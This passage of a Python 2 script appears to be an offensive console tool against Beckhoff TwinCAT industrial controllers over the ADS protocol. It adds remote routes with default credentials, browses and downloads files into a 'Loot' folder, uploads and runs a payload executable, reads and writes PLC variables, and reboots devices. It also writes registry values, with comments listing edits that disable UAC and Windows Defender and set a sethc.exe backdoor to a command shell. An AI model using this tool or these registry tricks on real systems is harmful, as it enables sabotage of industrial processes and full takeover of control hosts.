        print('Device is reachable and Twincat is running')
    elif  state['AdsState']=='Config':
        print('Device is reachable and Twincat is in CONFIG mode')
    elif  state['AdsState']=='Stop':
        print('Device is reachable and Twincat is stopped')
    else:
        print('Device unreachable. Please add remote route!')
        ans=raw_input('Do you want to add one now? [y/N]: ').lower()
        if ans=='y': 
            GUI_addRoute(Device, HostDevice)
        return state
    raw_input('Press [Enter] to continue')
    return state

def GUI_ChooseHostID():
    global HostDevice
    os.system('cls' if os.name == 'nt' else 'clear')
    ## Select Adapter
    i=1
    arrInterfaces=getAddresses()
    for ip in arrInterfaces:
        print('['+str(i)+'] '+ip)
        i+=1
    print('[Q] Quit now')
    if i>2: answer=raw_input('Please select the adapter [1]: ')
    else: answer=str(i-1)

    if answer.lower()=='q': exit()
    if answer=='' or not answer.isdigit() or int(answer)>=i: answer=1
    HostDevice['IP'] = arrInterfaces[int(answer)-1]
    if  HostDevice['RNETID'] == '' :HostDevice['RNETID'] =  HostDevice['IP']  + '.1.1'
    return

def GUI_getInfo(Device,HostDevice):
    os.system('cls' if os.name == 'nt' else 'clear')
    state=GUI_VerifyDevice(Device,HostDevice,1)
    if state['AdsState']=='Error' or state['AdsState']=='Invalid':
        return

    if Device['TCVER'].startswith('2'):
        print('This device uses Twincat 2, only basic details are shown')

    print('      ###--- DEVICE INFO ---###')        
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(iTimeout)
    s.connect((Device['IP'],HostPort))

    if Device['TCVER'].startswith('3'):
        import xml.etree.ElementTree as ET      
        resp = getDeviceXML(Device,HostDevice,s)
        try:
            root = ET.fromstring(resp)

            print('TargetType: '+root[0].text)
            print('TargetVersion: '+root[1][0].text+'.'+root[1][1].text+'.'+root[1][2].text)
            print('TargetFeatures (NetId): '+root[2][0].text)
            print('Hardware: Model='+root[3][0].text+', Serial='+root[3][1].text+', Version='+root[3][2].text+', Date='+root[3][3].text+', Architecture='+root[3][4].text)
            print('OSImage: Device='+root[4][0].text+', Version='+root[4][1].text+', Level='+root[4][2].text+', OsName='+root[4][3].text+', OsVersion='+root[4][4].text)
            print
        except:
            pass
    print('OS Version: '+Device['WINVER'])
    print('Based on the devicename ('+Device['NAME']+'), ')
    print('   the MAC Address could be: 00-01-05-'+Device['NAME'][-6:-4]+'-'+Device['NAME'][-4:-2]+'-'+Device['NAME'][-2:])
    print
    print('      ###--- DEVICE REMOTE ROUTES ---###')
    getRemoteRoutes(Device, HostDevice , s , True)
    print  
    state=getDeviceState(Device,HostDevice,s)
    s.close()
    print('      ###--- TWINCAT SERVICE ---###')
    print('Twincat version: '+Device['TCVER'])
    print('Twincat is currently in '+state['AdsState']+' mode')
    print
    raw_input('Press [Enter] to continue')

def GUI_addRoute(Device, HostDevice):
    os.system('cls' if os.name == 'nt' else 'clear')
    user = passw = ''
    state = GUI_VerifyDevice(Device,HostDevice,1)
    if not state['AdsState']=='Error' and not state['AdsState']=='Invalid':
        print('Device seems reachable, sure to add a route?')
        ans=raw_input('Please type \'Y\' to do so [y/N]: ')
        if not ans.lower()=='y': return
    #if not device['WINVER'].split('.')[1]=='0':
    #    print('Device is running non Windows CE (kernel '+device['WINVER']+'), correct credentials needed:')
    #    user=raw_input('Device username [guest]: ')
    #    passw=raw_input('Device password [1]: ')
    if '.' in Device['WINVER'] and Device['WINVER'].split('.')[1]=='0':
        print('Device is running Windows CE (kernel '+Device['WINVER']+'), any credentials may work!')
    user=raw_input('Device username [Administrator]: ')
    passw=raw_input('Device password [1]: ')
    if user=='': user='Administrator'
    if passw=='': passw='1'
    print('\nAdding route on '+Device['NAME']+' ('+Device['IP']+')')
    routename=socket.gethostname()
    ans=raw_input('Use default route name ('+routename+')? [Y/n]: ')
    if ans=='': ans='y'
    if not ans.lower()=='y':
        routename=raw_input('Please provide Route Name: ')

    print('Adding route '+routename+' for '+HostDevice['IP']+' with credentials '+user+'/'+passw)

    # [ nameroute , amsroute , username , password, ipaddres]
    sParam =[routename,HostDevice['RNETID'] , user, passw ,HostDevice['IP'] ]
    response = AddRoute(Device ,  HostDevice , sParam)

    print('Received AMS Net ID: '+response)
    print('Route added!')
    raw_input('Press [Enter] to continue')
    return

def GUI_delRoute(Device, Hostdevice):
    os.system('cls' if os.name == 'nt' else 'clear')

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((Device['IP'],HostPort))
    s.settimeout(iTimeout)
    state = getDeviceState(Device,Hostdevice,s)
    if state['AdsState']=='Error' or state['AdsState']=='Invalid':
        print('Device unreachable. Please add remote route!')
        raw_input('Press [Enter] to continue')
        return
    
  
    bMyRoute=False

    print('Hold on, receiving...')
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    arrRouteNames = getRemoteRoutes(Device, Hostdevice , s , False)

    i=1
    for route in arrRouteNames:
        print('['+str(i)+'] '+route[0]+' ('+route[1]+')')
        i+=1
    print('[C] Cancel')
    answer=raw_input('Which route to delete? [C]: ')
    if answer=='' or not answer.isdigit() or int(answer)>=i:
        s.close()
        return
    if arrRouteNames[int(answer)-1][1]==Hostdevice['IP']:
        bMyRoute=True
        ans=raw_input('Deleting your own route will result in connection failure, sure? [y/N]: ')
        if not ans.lower()=='y':
            s.close()
            return
    
    routename=arrRouteNames[int(answer)-1][0]
    print
    print('Deleting Route "'+routename+'"')
    responseErrorCode =  RemoveRoute(Device, HostDevice , s , routename)


   

    if bMyRoute:
        state = getDeviceState(Device,Hostdevice,s)
        if state['AdsState']=='Error' or state['AdsState']=='Invalid': print('Successful!')
        else: print('There was an error')
    else:
        if responseErrorCode == 0: print('Successful!')
        else: print('Some error occured')
    s.close()
    raw_input('Press [Enter] to continue')
   
    return

def GUI_SetTwincat(Device, Hostdevice):
    os.system('cls' if os.name == 'nt' else 'clear')
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((Device['IP'],HostPort))
    s.settimeout(iTimeout)
    state = getDeviceState(Device,Hostdevice,s)

    print('      ###--- TWINCAT SERVICE ---###')
    print('Twincat is currently in '+state['AdsState']+' mode')
    print
    print('[1] RUN')
    print('[2] STOP')
    print('[3] CONFIG')
    print('[4] RESET')
    print('[C] Cancel')
    answer=raw_input('Which mode you want to restart Twincat? [C]: ').lower()
    if answer=='' or not answer.isdigit() or int(answer)>4 or answer=='c': return

    options = ['RUN','STOP' , 'CONFIG' , 'RESET']
    try:
        selectedOption = options[int(answer)-1]
        setDeviceState(Device, HostDevice , s , selectedOption)
        print('Successful!')
    except Exception as oError:
        return
    raw_input('Press [Enter] to continue')

    s.close()
    return

def GUI_FileNavigator(Device , Hostdevice):
    global s
    sPath = 'C:\\'
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(iTimeout)
    s.connect(( Device['IP'],HostPort))
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Browse Files From Target Device')
        print('[q] Quit program')
        print('[d#] Download File (i.e. d5)')
        print('[o#] Open Directory (i.e. o1)')
        print('[r] Reset Path')
        print('[a] Reset Connection With target')
        print('[u] Upload File to location')
        print('[e#] run file')
        print('')
        print('Current path : ' +sPath )
        print('')
        print('Directory : ')
        AllItems = BrowseFile_V2(Device, HostDevice, s, sPath)
        i=1
        for oElement in AllItems:
            print('['+str(i)+'] '+ oElement['FileName'])
            i+=1

        answer = raw_input('Command : ')
        if answer.lower()=='q': break
        if answer.lower()=='r': sPath =  'C:\\'
        if answer.lower()[0:1] == 'd' :
            iIndex = int(answer[1:])-1
            DownloadFile(Device , Hostdevice , s,sPath , AllItems[iIndex]['FileName'])
            raw_input('Press enter')
        if answer.lower()[0:1]=='o':
            iIndex = int(answer[1:])-1
            sPath += AllItems[iIndex]['FileName'] + '\\'
        if answer.lower()=='a':
            s.close()
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(iTimeout)
            s.connect(( Device['IP'],HostPort))
        if answer.lower()=='u':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Upload file to " + sPath)
            print()
            print("Select File to upload [default : payload.jpg] ")
            print("[C] to cancel")
            sFileName = raw_input('File: ')
            if sFileName.lower() =='': sFileName ='payload.exe'
            if sFileName.lower() != 'c':
                #if '\\' in sFileName: sFileName = sFileName.split('\\')[sFileName.split('\\').length()-1]
                if '\\' in sFileName:
                    print('Only files in current folder please')
                else:
                    ans = raw_input('Upload and execute? [y/N]: ')
                    if ans == '': ans = 'n'
                    Upload_File(Device, HostDevice, s, sFileName, sPath + sFileName)
                    if ans.lower()[0] == 'y': RemoteCodeExecution(Device, Hostdevice, s, sPath.split('\\..\\')[0] + sFileName, sPath, '')
        if answer.lower()[0:1]=='e':
            iIndex = int(answer[1:])-1
            RemoteCodeExecution(Device , Hostdevice , s,sPath  + AllItems[iIndex]['FileName'], sPath , '')
    s.close()

def GUI_ChangeDeviceState(Device , HostDevice):
    os.system('cls' if os.name == 'nt' else 'clear')
    print('Change Device State :')
    print('[1] Reboot')
    print('[2] Shutdown')
    print('[C] Cancel')
    answer = raw_input('Option [C]: ')
    if answer == '' or answer.lower() == 'c': return
    print('')
    delay = raw_input('Delay (in seconds) [0]: ')
    if delay.lower() == '': delay = '0'
    if not delay.isdigit() : return

    answer2 = raw_input('Do you really want to reboot/shutdown device [y/N]: ')
    if answer2.lower() == 'n' or answer2 == '': return
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(iTimeout)
    s.connect((Device['IP'],HostPort))
    if answer == '1': RebootDevice(Device, HostDevice, s , int(delay))
    if answer == '2': ShutdownDevice(Device, HostDevice, s, int(delay))
    s.close()
    print("Reboot Successful")
    raw_input()
    return

def GUI_Variables(Device, HostDevice):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("Variables")
        print('[1] Get All variables in PLC (output xml)')
        print('[2] Read Variable ')
        print('[3] Write Variable ')
        print('[C] Cancel')
        answer = raw_input("command [C] : ")
        print('')
        if not answer.isdigit() or answer.lower() == 'c'or answer.lower() == '': break
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(iTimeout)
        s.connect(( Device['IP'],HostPort))
        if answer == '1' : 
            GetListVariables(Device, HostDevice, s)
            print("Variable Information Successful read")
            print("Location file : Loot/"+ Device['IP'] +'/OverviewVars.xml')
            raw_input("[enter]")
        if answer == '2' :
            IndexGroup = raw_input('Indexgroup : ')
            IndexOffset = raw_input('IndexOffset : ')
            Length = raw_input('Lengt of Data : ')
            print("What Type variable do you expect")
            print('[1] String')
            print('[2] Integer')
            print('[3] Other (Bytes)')
            answer2 = raw_input('Type [3]:')
            if answer2 =='1': Result = ReadVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length , 'STRING')
            elif answer2 =='2': Result =ReadVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length , 'INT')
            else : Result =ReadVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length )
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Result : " )
            print("IndexGroup  : " +IndexGroup )
            print("IndexOffset : " +IndexOffset)
            print("Length      : " + Length)
            print('')
            print('Variable value : ')
            print('')
            print(Result)
            print('')
            raw_input("[Enter]")
        if answer == '3':
            IndexGroup = raw_input('Indexgroup : ')
            IndexOffset = raw_input('IndexOffset : ')
            Length = raw_input('Lengt of Data : ')
            Data = raw_input('Data to write : ')
            print("What Type variable do you want to write")
            print('[1] String')
            print('[2] Integer')
            print('[3] Other (Bytes)')
            answer2 = raw_input('Type [3]:')
            if answer2 =='1': Result = WriteVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length, Data )
            elif answer2 =='2': Result =WriteVariable(Device, HostDevice , s , IndexGroup , IndexOffset ,Length, ConvertInt(Data , Length))
            else : Result =WriteVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length, Data ) #potentieel hier nog iets nodig om het beter te laten werken
            print('Write action executed')
            print('Read result:')
            print('')
            if answer2 =='1': Result = ReadVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length , 'STRING')
            elif answer2 =='2': Result =ReadVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length , 'INT')
            else : Result =ReadVariable(Device, HostDevice , s , IndexGroup , IndexOffset , Length )
            print('')
            raw_input('[Enter]')
        s.close()
    return

def GUI_Registry(Device, HostDevice):
    os.system('cls' if os.name == 'nt' else 'clear')
    ## Actions on the registry via ADS
    print('## All actions are on hive "HKLM"')
    print('##  Since TwinCAT is still running as a 32-Bit process, all HKLM\\SOFTWARE keys will be stored/read as')
    print('##    HKLM\\SOFTWARE\WOW6432Node')
    print('Read or Write a Registry Value?')
    print('[r] Read a value')
    print('[w] Write a value')
    answer = raw_input('Action [r]:')
    if not answer.lower() == 'w': answer = 'r'
    if answer == 'r':
        print('Paths are relative to HKLM ...')
        sRegPath = raw_input('Which path to open [SYSTEM\\CurrentControlSet\\Control\\SystemInformation]?: ')
        if sRegPath == '': sRegPath = 'SYSTEM\\CurrentControlSet\\Control\\SystemInformation'
        sRegVar = raw_input('Which value to read [BIOSVersion]?: ')
        if sRegVar == '': sRegVar = 'BIOSVersion'
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(iTimeout)
        s.connect(( Device['IP'],HostPort))
        print('Read result:')
        print(Read_Registry_Value(Device, HostDevice, s, sRegPath, sRegVar))
        s.close()
    else:
        #SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 ## This enables psexec for administrator users
        #SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA /t REG_DWORD /d 0  ## This disables UAC (after reboot)
        #SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\ /v debugger /t REG_SZ /d "powershell -c cmd" ## This allows hotkeys to call cmd
        #SOFTWARE\Policies\Microsoft\Windows Defender\ /v DisableAntiSpyware /t REG_DWORD /v 1 ## This disables AV (after reboot)
        sRegPath = raw_input('Which path to use [SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\]?: ')
        if sRegPath == '': sRegPath = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\'
        sRegVar = raw_input('Which key to use [EnableLUA]?: ')
        if sRegVar == '': sRegVar = 'EnableLUA'
        sRegVal = raw_input('Which value to set [0]: ')
        if sRegVal == '': sRegVal = '0'
        sType = raw_input('REG_DWORD or REG_SZ [D/s]?: ')
        if sType == '': sType == 'd'
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(iTimeout)
        s.connect(( Device['IP'],HostPort))
        print('Writing value:')
        bDWORD = 1
        if sType.lower() == 's': bDWORD = 0
        bResult = Set_Registry_Value(Device , HostDevice ,s, sRegPath , sRegVar, sRegVal, bDWORD)
        if bResult is None:
            print('Key '+sRegPath+'\\'+sRegVar+' with value '+sRegVal+' correctly set.')
        else:
            print('Something went wrong, typo maybe?')
        s.close()
        ##Set_Registry_Value(Device , HostDevice ,s, sRegPath , sRegVar, sNewVal):
    raw_input('Press any key to continue')
    return

def GUI_Main():
    global HostDevice
    GUI_ChooseHostID()
    os.system('cls' if os.name == 'nt' else 'clear')
    ## Get Devicelist (array of 'IP', 'NAME', 'AMSNetID', 'Twincatversion [TCVER]', 'Kernelbuild [WINVER]')
    arrDevices=getDevices()
    if len(arrDevices)==0:
        print('No devices found, stopping')
        raw_input('Press [Enter]')
        exit()

    # MAIN FUNCTIONALITY
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('      ###--- DEVICELIST ---###')
        i=1
        for device in arrDevices:
            print('['+str(i)+'] '+device['IP']+' ('+device['NAME']+', '+device['RNETID']+', '+device['WINVER']+', '+device['TCVER']+')')
            i+=1
        print('[Q] Quit now')
        answer=raw_input('Please select the device [1]: ')
        if answer.lower() == 'q': exit()
        if answer=='' or not answer.isdigit() or int(answer)>=i: answer=1
        Device=arrDevices[int(answer)-1]
        ## Device Menu
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print('###--- MAIN MENU FOR '+Device['NAME']+' ---###')
            print('Kernel: '+Device['WINVER']+'\n')
            print('[1] Verify connectivity')
            print('[2] List more information, including routes')
            print('[3] Add Route')
            print('[4] Delete Route')
            print('[5] Change Twincat State')
            print('[6] Browse Files')
            print('[7] Shutdown/restart Device')
            print('[8] PLC variables')
            print('[9] Registry Actions')
            print
            print('[O] Choose other device')
            print('[Q] Quit now')
            print
            answer2 = raw_input('Please select what you want to do with ' + Device['NAME'] + ' (' + Device['IP'] + ')' + ' [1]: ')
            if answer2.lower()=='q': return
            if answer2.lower()=='2': GUI_getInfo(Device,HostDevice)
#            if answer2.lower()=='3': GUI_addRoute(Device, HostDevice)
            if answer2.lower()=='3': addTCRoute(Device, HostDevice)
            if answer2.lower()=='4': GUI_delRoute(Device, HostDevice)
            if answer2.lower()=='5': GUI_SetTwincat(Device, HostDevice)
            if answer2.lower()=='6': GUI_FileNavigator(Device, HostDevice)
            if answer2.lower()=='7': GUI_ChangeDeviceState(Device, HostDevice)
            if answer2.lower()=='8': GUI_Variables(Device, HostDevice)
            if answer2.lower()=='9': GUI_Registry(Device, HostDevice)
            if answer2.lower()=='o': break
            if answer2.lower()=='1' or answer2=='': GUI_VerifyDevice(Device , HostDevice)
    return

#endregion
    

GUI_Main()
